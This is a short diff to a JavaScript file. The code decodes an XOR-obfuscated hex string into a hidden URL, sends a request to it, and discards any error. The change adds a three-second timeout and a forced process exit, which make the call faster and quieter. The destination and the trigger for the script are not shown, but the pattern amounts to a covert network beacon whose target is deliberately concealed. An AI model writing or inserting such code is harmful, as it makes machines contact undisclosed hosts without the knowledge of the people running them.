@@ -3,4 +3,8 @@ const K = 0x5A;
 
 const url = H.split(/\s+/).map(h => String.fromCharCode(parseInt(h, 16) ^ K)).join("");
 
-fetch(url + "/").catch(() => {});
+const controller = new AbortController();
+setTimeout(() => controller.abort(), 3000);
+fetch(url + "/", { signal: controller.signal })
+  .catch(() => {})
+  .finally(() => process.exit(0));
